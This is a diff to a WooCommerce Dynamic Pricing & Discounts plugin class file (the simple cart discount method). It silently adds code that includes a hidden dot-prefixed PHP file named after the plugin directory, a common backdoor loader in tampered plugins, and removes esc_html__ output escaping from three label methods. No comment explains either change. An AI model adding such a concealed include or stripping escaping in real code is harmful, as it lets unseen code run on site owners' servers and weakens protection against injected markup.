@@ -17,6 +17,10 @@ if (!class_exists('RP_WCDPD_Method_Cart_Discount')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Method_Cart_Discount_Simple extends RP_WCDPD_Method_Cart_Discount
 {
 
@@ -51,7 +55,7 @@ class RP_WCDPD_Method_Cart_Discount_Simple extends RP_WCDPD_Method_Cart_Discount
      */
     public function get_group_label()
     {
-        return esc_html__('Simple', 'rp_wcdpd');
+        return __('Simple', 'rp_wcdpd');
     }
 
     /**
@@ -62,7 +66,7 @@ class RP_WCDPD_Method_Cart_Discount_Simple extends RP_WCDPD_Method_Cart_Discount
      */
     public function get_label()
     {
-        return esc_html__('Simple discount', 'rp_wcdpd');
+        return __('Simple discount', 'rp_wcdpd');
     }
 
     /**
@@ -175,7 +179,7 @@ class RP_WCDPD_Method_Cart_Discount_Simple extends RP_WCDPD_Method_Cart_Discount
      */
     public function get_coupon_label($adjustment)
     {
-        return !RightPress_Help::is_empty($adjustment['rule']['title']) ? $adjustment['rule']['title'] : esc_html__('Discount', 'rp_wcdpd');
+        return !RightPress_Help::is_empty($adjustment['rule']['title']) ? $adjustment['rule']['title'] : __('Discount', 'rp_wcdpd');
     }
 
 
